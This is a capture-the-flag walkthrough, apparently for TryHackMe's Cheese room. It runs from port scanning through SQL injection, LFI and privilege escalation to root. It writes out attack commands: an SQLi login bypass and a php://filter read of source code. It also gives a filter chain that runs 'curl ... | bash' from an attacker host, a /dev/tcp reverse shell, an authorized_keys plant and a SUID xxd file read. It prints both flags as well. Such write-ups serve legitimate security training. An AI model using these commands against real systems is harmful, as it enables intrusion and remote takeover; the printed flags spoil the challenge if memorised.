# CHEESE CTF | TryHackMe Room
![1](./images/0.png)
This walkthrough details the step-by-step process of solving the CHEESE CTF, covering reconnaissance, exploitation, privilege escalation, and ultimately gaining root access. The target machine had several vulnerabilities, including SQL injection, Local File Inclusion (LFI), and misconfigured systemd timers.


### **1. Initial Reconnaissance**

**Port Scanning**

- Used Nmap to scan the first 1000 ports (nmap -p 1-1000 <TARGET_IP>).
![1](./images/1.png)

- Found that FTP (21), SSH (22), and HTTP (80) were open.
- Ran a detailed scan on these ports (nmap -sV -A -p 21,22,80 <TARGET_IP>) to identify services and versions.
![1](./images/2.png)

**FTP Enumeration**

- Attempted to connect via FTP (ftp <TARGET_IP>), but encountered an error.
 ![3](https://github.com/user-attachments/assets/ff96c1ee-cb1a-4cac-b203-b8d301db921f)
Possible issues:
- Anonymous login disabled.
- Credentials required (not yet obtained).

**Web Enumeration (Port 80)**
- Visited http://<TARGET_IP> and inspected the page.
![4](https://github.com/user-attachments/assets/0ff111fc-e85f-47b3-b0f2-688dd9545174)

- Checked the source code for hidden comments or secrets—nothing found.
![5](https://github.com/user-attachments/assets/866ee626-b598-4b1b-b901-328905eaf49b)

- Discovered a login page (/login.php). 
![6](https://github.com/user-attachments/assets/c3569166-9430-453d-aba2-e175b484654b)



### **2. Exploiting SQL Injection**
**SQLmap for Automated Testing**

- Ran SQLmap to test for SQLi:
`sqlmap -u "http://<TARGET_IP>/login.php" --forms --batch`
![7](https://github.com/user-attachments/assets/2116f5ba-01dd-470d-929c-d4f93d7f363a)

- Found a SQL injection vulnerability in the login form and the redirection.
![8](https://github.com/user-attachments/assets/afe330b3-0a7e-45f7-ba85-4ec938bb7e8d)

- Extracted database information, including a username (comte) and its password hash.
![9](https://github.com/user-attachments/assets/c8a7e7d1-8100-4bff-b44e-ca309d333714)


**Manual SQL Injection Bypass**

- Used a classic SQLi payload to bypass authentication:
```
Username: comte ' AND 1='1 --
Password: anything
```
![10](https://github.com/user-attachments/assets/f53cabec-be72-481b-8f71-5dccca1cff78)

- Successfully logged in and was redirected to a dashboard (/dashboard.php).
![11](https://github.com/user-attachments/assets/53e055b8-aa84-4a85-af9e-4e56e1355783)



### **3. Exploiting Local File Inclusion (LFI)**
**Testing LFI in the file Parameter**

- Discovered an LFI vulnerability in the file parameter (e.g., ?file=/etc/passwd).
- Retrieved /etc/passwd, confirming user comte exists.
![12](https://github.com/user-attachments/assets/f239a641-8683-4527-8747-c9d05212e21c)


**Reading PHP Files via Base64 Encoding**
- Used PHP filters to read source code:
`?file=php://filter/convert.base64-encode/resource=secret-script.php`
![13](https://github.com/user-attachments/assets/bc848ef3-430f-4120-864f-1f3c62a63ab6)


- Decoded the Base64 output to analyze secret-script.php.
![14](https://github.com/user-attachments/assets/0c5d129c-863c-48b5-afaf-706775ddfd45)


**Log Poisoning → RCE**

- Since the server used PHP, leveraged PHP wrappers for RCE:
Wrote a malicious payload(revshell) with this bash reverse shell.
`bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1` 
- I used the php-filter-chain script from the github to generate the filters to upload 
[🔗 Github link for the script ](https://github.com/synacktiv/php_filter_chain_generator.git)
using command

`python3 php_filter_chain_generator.py --chain '<?= 'curl -s -L <Attacker_IP>/<payload name>|bash' ?>'`
![15](https://github.com/user-attachments/assets/1d7ffe22-ade6-415e-b3a3-0f0dff277c24)

- Hosted it on a local server and triggered it via LFI.
`python3 -m http.server 80`
- Set up a listener  and received a shell.
`nc -lvnp <port>`
![16](https://github.com/user-attachments/assets/66814261-96fa-4b99-8ede-f08af2717c1f)


**User Flag**
- Found the user.txt in the home/comte directory but it had no permissions for us. as we are logged in as `www-data`
![17](https://github.com/user-attachments/assets/ac1b57c6-30e8-44d2-86e7-2b06a5b84d18)

- Found that /home/comte/.ssh/ had write permissions.
![18](https://github.com/user-attachments/assets/f3b421dd-c113-4296-91f3-ce1d969baaf6)

- Generated an SSH key pair (ssh-keygen).
![19](https://github.com/user-attachments/assets/f20e2be6-e418-47f6-8bba-ae55d2e25b91)

- Copied the public key (.pub) into authorized_keys.
![20](https://github.com/user-attachments/assets/d1607631-50de-4447-989a-74605bc9c272)

- Logged in via SSH and obtained the user flag.
`ssh comte@<TARGET_IP>`
![21](https://github.com/user-attachments/assets/09b87653-158c-417d-9ec0-81dd514f869e)
`THM{9f2ce3df1beeecaf695b3a8560c682704c31b17a}`


### **4. Privilege Escalation (User → Root)**
**Abusing Systemd Timer Privileges**
- Checked sudo privileges (sudo -l), found systemctl access.
![22](https://github.com/user-attachments/assets/e5de6f88-6066-4009-a878-a27a1442a99e)
- Discovered a misconfigured systemd timer (exploit.timer). and Modified the timer to execute immediately:
```
OnBootSec=0  
OnUnitActiveSec=0  
```
- ![23](https://github.com/user-attachments/assets/a6392e95-c03c-400d-9cff-797bcc587fec)


- Found the services it will triggered

![24](https://github.com/user-attachments/assets/faa4280e-4aee-467c-b5cd-1e85a7e4244a)

- I looked in the .services and then I started the timer.
`sudo systemctl start exploit.timer`
![25](https://github.com/user-attachments/assets/d97e5090-3ad1-42c6-b4a7-58be453bdefa)


**Reading Root Flag via xxd**
- Found that xxd (a hexdump utility) saved as a copy had SUID permissions.
![26](https://github.com/user-attachments/assets/b67576f6-6dad-4efc-8254-9fed5e1c0ca3)

- Used xxd to read /root/root.txt:
`xxd "/root/root.txt" | xxd -r`
![27](https://github.com/user-attachments/assets/5760dad8-4b5c-4364-a53a-be793792d92c)
`THM{dca75486094810807faf4b7b0a929b11e5e0167c}`
